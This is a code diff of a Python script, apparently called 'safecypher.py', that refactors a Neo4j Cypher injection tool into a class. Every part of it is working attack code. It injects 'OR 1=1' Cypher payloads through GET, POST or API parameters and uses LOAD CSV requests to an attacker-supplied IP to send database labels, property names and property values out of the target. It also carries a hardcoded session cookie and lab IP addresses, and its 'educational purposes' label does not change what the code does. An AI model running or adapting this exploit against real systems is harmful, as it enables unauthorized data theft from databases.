@@ -1,96 +1,82 @@
 import argparse
 import requests
-import urllib
-import sys
+import urllib.parse
 
-headers = {
-    'Host': '192.168.17.158:3030',
-    'User-Agent': 'curl/8.5.0',
-    'Accept': '*/*',
-    'Connection': 'close',
-}
+class Neo4jInjector:
+    def __init__(self, target, exfil_ip, request_type, parameters, cookie=None):
+        self.target = target
+        self.exfil_ip = exfil_ip
+        self.request_type = request_type
+        self.parameters = parameters
+        # Check if a cookie was provided and split it into a dictionary if so
+        self.cookie = {cookie.split('=')[0]: cookie.split('=')[1]} if cookie else None
+        self.headers = {
+            'User-Agent': 'curl/8.5.0',
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }
+        self.proxies = {
+            'http': 'http://127.0.0.1:8080',
+        }
 
-proxies = {
-    'http': 'http://127.0.0.1:8080',
-}
+    def inject_payload(self, payload):
+        injection_characters = ["-1", "'", "\""]
+        for injection_character in injection_characters:
+            full_payload = injection_character + payload
+            encoded_payload = urllib.parse.quote(full_payload, safe='')
+            url, data = self.prepare_request_data(encoded_payload)
+            self.execute_request(url, data)
 
-cookies = {
-    'x': '17ab96bd8ffbe8ca58a78657a918558'
-}
-
-
-
-def inject_payload(target, payload, request_type, parameters):
-    #injection_characters = [["NONEXIST'", "Property"], ["-1", "ID"]]
-    injection_characters = [" ", "'", "\""]  
-    for i in range(len(injection_characters)):
-        full_payload = injection_characters[i] + payload
-        encoded_payload = urllib.parse.quote(full_payload, safe='')
-        if request_type == "API":
-            url = target + parameters + encoded_payload
-        elif request_type == "GET":
-            url = f"{target}?{parameters}={encoded_payload}"
-        elif request_type == "POST":
-            full_payload = injection_characters[i] + payload
-            url = target
-            data = f"{parameters}={encoded_payload}"
+    def prepare_request_data(self, encoded_payload):
+        if self.request_type == "API":
+            url = self.target + self.parameters + encoded_payload
+            data = None
+        elif self.request_type == "GET":
+            url = f"{self.target}?{self.parameters}={encoded_payload}"
+            data = None
+        elif self.request_type == "POST":
+            url = self.target
+            data = f"{self.parameters}={encoded_payload}"
         else:
-            print("Invalid request type")
+            raise ValueError("Invalid request type")
+        return url, data
+
+    def execute_request(self, url, data=None):
         try:
-            if request_type == "POST":
-                response = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, verify=False, proxies=proxies,
-                                         cookies=cookies)
+            if self.request_type == "POST":
+                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)
             else:
-                response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
+                response = requests.get(url, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)
 
             if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
-                print(f"Injection Character {injection_characters[i]} ... Check your listener")
+                print(f"Payload Injected")
+
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
 
+    def exfil_data(self):
+        print("Dumping Labels")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
+        label = input("Enter Label: ")
 
-def exfil_data(target, exfil_ip, request_type, parameters):
-    print("Dumping Labels")
-    inject_payload(target, f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{exfil_ip}/?label='+label as l RETURN 0 as _0 //", request_type, parameters)
-    label = input("Enter Label: ")
+        print("Dumping Properties")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
 
-    print("Dumping Properties")
-    inject_payload(target, f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p as l RETURN 0 as _0 //", request_type, parameters)
-
-    print("Dumping Value of Properties") 
-    inject_payload(target, f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //", request_type, parameters)
-
-
+        print("Dumping Value of Properties")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
 
 def main():
-    examples = """
-Examples:
-
-API:
-python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p /name/ -l 192.168.17.128 -t API
-
-
-
-GET:
-python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t GET
-
-
-POST:
-python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t POST
-    """
-    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j", formatter_class=argparse.RawTextHelpFormatter, epilog=examples)
-    parser.add_argument("-u", "--url", required=True, help="Target URL: http://192.168.17.158:3030/api/neo4j/characters")
-    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP: 127.0.0.1")
-    parser.add_argument("-t", "--type", required=True, help="API/GET/POST")
-    parser.add_argument("-p", "--parameters",required=True, help="Vulnerable parameters")
+    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP")
+    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
+    parser.add_argument("-p", "--parameters", required=True, help="Vulnerable parameters")
+    parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
     args = parser.parse_args()
 
-    target = args.url
-    exfil_ip = args.exfil_ip
-    request_type = args.type
-    parameters = args.parameters
+    injector = Neo4jInjector(args.url, args.exfil_ip, args.type, args.parameters, args.cookie)
 
-    exfil_data(target, exfil_ip, request_type, parameters)
+    # Begin exfiltration process
+    injector.exfil_data()
 
 if __name__ == "__main__":
     main()
